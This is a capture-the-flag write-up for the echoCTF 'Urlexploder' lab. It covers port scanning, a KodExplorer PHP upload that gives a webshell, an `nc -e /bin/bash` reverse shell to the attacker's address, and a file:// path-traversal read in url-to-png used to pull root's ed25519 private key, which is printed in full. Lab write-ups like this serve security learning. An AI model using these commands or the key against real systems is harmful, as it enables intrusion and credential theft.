---
description: >-
  Urlexploder echoCTF Machine
title: Urlexploder (Intermediate)                # Add title here
date: 2025-01-24 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Urlexploder.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.235
```

### Content

- KodExplorer Dangerous File Upload leading to RCE
- Arbitrary File Read via Playwright's Screenshot Feature Exploiting File Wrapper

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
cat allPorts 
# Nmap 7.94SVN scan initiated Fri Jan 24 22:37:55 2025 as: nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.235
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.235 ()   Status: Up
Host: 10.0.160.235 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///

```
Services and Versions running:
```bash
# Nmap 7.94SVN scan initiated Fri Jan 24 23:11:06 2025 as: nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.235
Nmap scan report for 10.0.160.235
Host is up, received user-set (0.17s latency).
Scanned at 2025-01-24 23:11:07 EST for 41s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   256 db:11:dd:7f:d8:dd:fe:0e:61:4c:3e:59:89:c6:e7:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdp13tqB/Uxu32MFZtasmeHOM0ueGElZo4lEkwRGqX93ECOMnYlO/Tam1LuihI0SA847wB36KoW6sV60NJ+VI=
|   256 54:5b:00:b8:34:d8:c0:a6:27:f7:e5:4d:c6:52:5c:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID2/nUUxae+gYgRz9NWhGR5uY88FnnGbROgJiWaruAO8
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     KOD_SESSION_ID_7da51: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 8B93800E9876BD86C2C4280F05066EE0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET
| http-title: KodExplorer - Powered by KodExplorer
|_Requested resource was ./index.php?user/login
|_http-generator: KodExplorer 4.49
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploitation

Only HTTP port tcp-80 is open, by exploring it we notice that there is a CMS called KodExplorer:
![](/assets/img/Pasted-image-20250124221442.png)

While investigating this CMS, we identify various exploits, but the most interesting one is under this [Github post](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/kalcaddle/2023/KodExplorerKodExplorer-4.51.03) also the same post makes a reference to a [Youtube video](https://www.youtube.com/watch?v=stfT7BtulQ0&ab_channel=nu11secur1ty) that provides with a full PoC that we can follow to get a reverse shell, it is unnecessary to add the images of the guide since it is self-explanatory.

By following the steps, you should be able to upload a PHP file and select the option "Open in browser(B)" as shown in the image below:
![](/assets/img/Pasted-image-20250124222013.png)

In that way, we will have a webshell that we can use to get a revshell using netcat:

![](/assets/img/Pasted-image-20250124222120.png)

Using the clasic `nc -e /bin/bash 10.10.5.122 1234`:

![](/assets/img/Pasted-image-20250124222340.png)

### Privilege Escalation

Privilege Escalation for this one was a pain in the ass, we first started by searching interesting processes using `ps -aux` 

```bash
www-data@urlexploder:~/html/data/User/pwnedadmin/home/desktop$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         137  0.0  0.5 11508908 48520 pts/0  Sl   16:02   0:00 node /opt/url-to-png-2.0.1/node_modules/.bin/../tsx/dist/cli.mjs --watch src/main.ts
root         138  0.0  0.5 1022592 46556 pts/0   Sl   16:02   0:00 node /opt/url-to-png-2.0.1/node_modules/.bin/../pino-pretty/bin.js
root         165  0.0  0.5 989580 46336 pts/0    Sl   16:02   0:00 /usr/bin/node --require /opt/url-to-png-2.0.1/node_modules/.pnpm/tsx@4.11.0/node_modules/t
root         171  0.4  1.2 64713368 98888 pts/0  Sl   16:02   0:01 /usr/bin/node --require /opt/url-to-png-2.0.1/node_modules/.pnpm/tsx@4.11.0/node_modules/t
root         183  0.0  0.1 721568 13064 pts/0    Sl   16:02   0:00 /opt/url-to-png-2.0.1/node_modules/.pnpm/@esbuild+linux-x64@0.20.2/node_modules/@esbuild/l
root         316  0.0  1.1 34047236 89736 ?      Ssl  16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --disable-field-trial-config 
root         317  0.0  1.0 34055452 88400 ?      Ssl  16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --disable-field-trial-config 
root         320  0.0  0.7 33875100 58836 ?      S    16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=zygote --no-zygote-san
root         321  0.0  0.7 33875100 58792 ?      S    16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=zygote --no-zygote-san
root         322  0.0  0.7 33875088 59084 ?      S    16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=zygote --no-sandbox --
root         323  0.0  0.7 33875088 59048 ?      S    16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=zygote --no-sandbox --
root         355  0.0  0.6 33970392 49320 ?      Sl   16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=gpu-process --no-sandb
root         356  0.0  0.9 33924688 75712 ?      Sl   16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=utility --utility-sub-
root         370  0.0  0.6 33970392 49328 ?      Sl   16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=gpu-process --no-sandb
root         378  0.0  0.9 33924688 75440 ?      Sl   16:02   0:00 /root/.cache/ms-playwright/chromium-1117/chrome-linux/chrome --type=utility --utility-sub-
```

Some interesting processes are shown, specially one that is called ms-playwright and a process is also being called from the `/opt` directory called url-to-png-2.0.1, those two are interesting to check.

In second place we search for interesting files, inside `/tmp` directory with the following content:

![](/assets/img/Pasted-image-20250125002042.png)

As shown on permissions only the `tsx-0` directory is accesible, inside of it there are some unknown files:
![](/assets/img/Pasted-image-20250125002205.png)

All the files in here includes a path that is a process running in the previous `ps -aux` command, which makes this url to png 2.0.1 more interesting:
![](/assets/img/Pasted-image-20250126101131.png)

Looking for vulnerabilities for this binary, there is one that looks pretty interesting:

![](/assets/img/Pasted-image-20250126212527.png)

Basically, the PoC is a Path Traversal that allows a user to read files using a `file://` scheme:

![](/assets/img/Pasted-image-20250126212731.png)

Now, while trying with the initial webpage we discover that is not working for it, so we investigate other open services on the machine:

```bash
www-data@urlexploder:/tmp$ ss -tuln 
Netid    State     Recv-Q    Send-Q   Local Address:Port
udp      UNCONN    0         0        127.0.0.11:51087  
tcp      LISTEN    0         128      0.0.0.0:22        
tcp      LISTEN    0         511      0.0.0.0:80        
tcp      LISTEN    0         511      127.0.0.1:3089    
tcp      LISTEN    0         4096     127.0.0.11:38077  
tcp      LISTEN    0         128      [::]:22           

```

The port 3089 is not a common open port so I sent an HTTP request to see if the server is web or not:
```bash
www-data@urlexploder:/tmp$ curl -s http://127.0.0.1:3089/
{"message":"Invalid query parameters"}
```

And surprisingly enough, it is, now using the PoC we can see that there is a file being downloaded, at first glance it looks like the `/etc/passwd` is downloaded, but looking the content of the file it seems like a PNG image:

![](/assets/img/Pasted-image-20250126213445.png)

To check the images better I decided to go and do a Port Forwarding using [Chisel](https://shuciran.github.io/posts/Chisel/) so I can see this images from my own browser and the result was the content of `/etc/passwd` on the image:

![](/assets/img/Pasted-image-20250126213828.png)

So we decide to grab the id_rsa directly from the /root directory, but there is an error if the file is not found:

![](/assets/img/Pasted-image-20250126214037.png)

In this cases, there are other types of private keys such as the id_rsa, some of them are created using Eliptyc Curves or other algorithms instead and some examples are as follows:

```text
id_rsa
id_ecdsa
id_ed25519
id_dsa
```

If there is a private key then we should check for the `authorized_keys`, which is a file that provides more info about it:

![](/assets/img/Pasted-image-20250126214833.png)

And as suspected, the algorithm used is ED25519 which is the abbreviature for Algorithm: EdDSA (Edwards-Curve Digital Signature Algorithm) using Curve25519, searching for this kind of algorithm provides details about the type of public key and private key and common name generated while creating them:

![](/assets/img/Pasted-image-20250126215856.png)

Looking up for this file using the Path Traversal vulnerability, throws the private key:

![](/assets/img/Pasted-image-20250126220022.png)

Now the interesting part was to extract the text from this one (I made a lot of mistakes while trying) I used Snagit to save me time, but here I got you:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBFmNuELVMDeb/xQStnwEkL0RjFD9msBy9Bi6Z4xztsPwAAAIjPmzllz5s5
ZQAAAAtzc2gtZWQyNTUxOQAAACBFmNuELVMDeb/xQStnwEkL0RjFD9msBy9Bi6Z4xztsPw
AAAEDDObDOfFBe45Bc8LenwEN1IUmI9KJrqk0E8Xyj7ZrW4UWY24QtUwN5v/FBK2fASQvR
GMUP2awHL0GLpnjHO2w/AAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
```

Finally, we have root shell:

![](/assets/img/Pasted-image-20250126220430.png)

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`enviornment variables (env command)`
`/root`


### Credentials

id_ed25519

### Notes

-  Always look for other type of private keys such as `id_ed25519`, `id_dsa`, `id_ecdsa` and so on if you can't find the classic `id_rsa`.

### References

- [KodExplorer RCE Video](https://www.youtube.com/watch?v=stfT7BtulQ0&ab_channel=nu11secur1ty)
- [Chisel Configuration](https://shuciran.github.io/posts/Chisel/)
